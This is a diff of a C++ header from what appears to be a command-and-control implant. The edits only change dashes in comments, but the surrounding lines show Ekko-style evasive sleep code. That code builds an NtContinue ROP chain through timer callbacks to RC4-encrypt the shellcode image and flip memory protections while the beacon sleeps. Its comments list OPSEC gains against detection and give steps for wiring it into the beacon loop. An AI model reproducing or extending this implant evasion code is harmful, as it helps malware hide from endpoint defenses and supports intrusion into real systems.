@@ -1,5 +1,5 @@
 /*
- * mask_ekko.h — Ekko-style evasive sleep with full image encryption.
+ * mask_ekko.h - Ekko-style evasive sleep with full image encryption.
  *
  * Based on the Ekko technique (Cracked5pider) and Nighthawk (MDSec).
  * Uses CreateTimerQueueTimer + NtContinue ROP chain to:
@@ -24,7 +24,7 @@
  *   - inst.evasion.ekko fields must be initialized
  *
  * OPSEC:
- *   + Entire shellcode image encrypted (RC4) during sleep — not just XOR
+ *   + Entire shellcode image encrypted (RC4) during sleep - not just XOR
  *   + Memory protection changes come from system timer thread
  *   + Agent thread call stack is clean (combined with Draugr)
  *   + No VirtualProtect calls traceable to shellcode
@@ -35,7 +35,7 @@
  *   - CFG-protected processes may block NtContinue as timer callback
  *
  * INTEGRATION:
- *   This replaces the entire sleep cycle — not just pre/post sleep.
+ *   This replaces the entire sleep cycle - not just pre/post sleep.
  *   Replace the sleep call in main.cc's beacon loop with ekko_sleep().
  *   The function handles masking, sleeping, and unmasking internally.
  *
@@ -56,14 +56,14 @@ typedef NTSTATUS (NTAPI *fn_NtContinue)( PCONTEXT, BOOLEAN );
 typedef NTSTATUS (NTAPI *fn_SystemFunction032)( USTRING*, USTRING* );
 
 /*
- * ekko_sleep — Evasive sleep with full-image RC4 encryption.
+ * ekko_sleep - Evasive sleep with full-image RC4 encryption.
  *
  * Replaces the standard NtDelayExecution sleep call.
  * The agent thread sleeps while the shellcode image is encrypted.
  *
  * Parameters:
- *   inst     — agent instance
- *   time_ms  — sleep duration in milliseconds
+ *   inst     - agent instance
+ *   time_ms  - sleep duration in milliseconds
  */
 auto declfn ekko_sleep( instance& inst, DWORD time_ms ) -> void {
     if ( !inst.evasion.ekko.initialized ) {
@@ -177,7 +177,7 @@ auto declfn ekko_sleep( instance& inst, DWORD time_ms ) -> void {
     ctx_prot_rw.R8   = PAGE_READWRITE;
     ctx_prot_rw.R9   = reinterpret_cast<DWORD64>( &old_protect );
 
-    /* Step 2: SystemFunction032( &img_str, &key_str ) — RC4 encrypt */
+    /* Step 2: SystemFunction032( &img_str, &key_str ) - RC4 encrypt */
     memory::copy( &ctx_encrypt, &ctx_thread, sizeof(CONTEXT) );
     ctx_encrypt.Rsp -= 8;
     ctx_encrypt.Rip  = reinterpret_cast<DWORD64>( pSystemFunction032 );
@@ -193,7 +193,7 @@ auto declfn ekko_sleep( instance& inst, DWORD time_ms ) -> void {
     ctx_prot_rx.R8   = PAGE_EXECUTE_READ;
     ctx_prot_rx.R9   = reinterpret_cast<DWORD64>( &old_protect );
 
-    /* Step 4: SetEvent( hEvent ) — signal completion */
+    /* Step 4: SetEvent( hEvent ) - signal completion */
     memory::copy( &ctx_signal, &ctx_thread, sizeof(CONTEXT) );
     ctx_signal.Rsp -= 8;
     ctx_signal.Rip  = reinterpret_cast<DWORD64>(
